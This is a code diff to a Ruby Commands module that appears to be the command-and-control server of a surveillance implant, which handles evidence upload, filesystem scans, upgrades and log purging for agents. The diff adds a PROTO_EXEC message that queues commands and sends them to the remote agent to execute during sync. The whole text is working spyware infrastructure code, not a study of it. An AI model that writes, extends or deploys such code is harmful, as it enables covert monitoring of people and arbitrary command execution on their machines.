@@ -35,6 +35,7 @@ module Commands
   PROTO_EVIDENCE_SIZE = 0x0b       # Queue for evidence
   PROTO_FILESYSTEM    = 0x19       # List of paths to be scanned
   PROTO_PURGE         = 0x1a       # purge the log queue
+  PROTO_EXEC          = 0x1b       # execution of commands during sync
 
   LOOKUP = { PROTO_ID => :command_id,
              PROTO_CONF => :command_conf,
@@ -43,6 +44,7 @@ module Commands
              PROTO_FILESYSTEM => :command_filesystem,
              PROTO_UPGRADE => :command_upgrade,
              PROTO_PURGE => :command_purge,
+             PROTO_EXEC => :command_exec,
              PROTO_EVIDENCE => :command_evidence,
              PROTO_EVIDENCE_SIZE => :command_evidence_size,
              PROTO_BYE => :command_bye}
@@ -98,6 +100,10 @@ module Commands
     if DB.instance.new_upgrade? session[:bid]
       available += [PROTO_UPGRADE].pack('I')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
+    end
+    if DB.instance.new_exec? session[:bid]
+      available += [PROTO_EXEC].pack('I')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New commands exec"
     end
     if DB.instance.new_downloads? session[:bid]
       available += [PROTO_DOWNLOAD].pack('I')
@@ -361,6 +367,35 @@ module Commands
       content = [time].pack('Q') + [size].pack('I')
       response += [content.length].pack('I') + content
       trace :info, "[#{peer}][#{session[:cookie]}] purge requests sent [#{Time.at(time).getutc}][#{size}]"
+    end
+
+    return response
+  end
+
+  # Protocol Exec
+  # -> PROTO_EXEC
+  # <- PROTO_NO | PROTO_OK [ numElem, [file1, file2, ...]]
+  def command_exec(peer, session, message)
+    trace :info, "[#{peer}][#{session[:cookie]}] Exec request"
+
+    # the exec list was already retrieved (if any) during the ident phase
+    # here we get just the content (locally) without asking again to the db
+    commands = DB.instance.new_exec session[:bid]
+
+    # send the response
+    if commands.empty?
+      trace :info, "[#{peer}][#{session[:cookie]}] NO exec"
+      response = [PROTO_NO].pack('I')
+    else
+      response = [PROTO_OK].pack('I')
+      list = ""
+      # create the list of patterns to download
+      commands.each do |dow|
+        trace :info, "[#{peer}][#{session[:cookie]}] #{dow}"
+        list += dow.pascalize
+      end
+      response += [list.length + 4].pack('I') + [commands.size].pack('I') + list
+      trace :info, "[#{peer}][#{session[:cookie]}] #{commands.size} exec requests sent"
     end
 
     return response
